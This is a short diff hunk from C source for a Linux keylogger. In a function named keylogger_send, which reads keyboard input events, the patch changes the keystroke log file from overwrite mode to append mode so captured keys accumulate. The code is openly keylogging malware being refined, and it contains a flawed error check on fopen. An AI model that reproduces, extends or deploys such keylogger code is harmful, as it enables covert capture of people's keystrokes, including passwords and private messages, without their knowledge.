@@ -194,7 +194,7 @@ void *keylogger_send(void *args_input) {
             if(events[i].type == EV_KEY) {
                 if(events[i].value == 1) {
                     if(events[i].code > 0 && events[i].code < NUM_KEYCODES) {
-                        if((fp = fopen(KEYLOGGER_FILENAME, "wb+")) < 0) {
+                        if((fp = fopen(KEYLOGGER_FILENAME, "ab+")) < 0) {
                             perror("fopen keylogger");
                             exit(1);
                         }
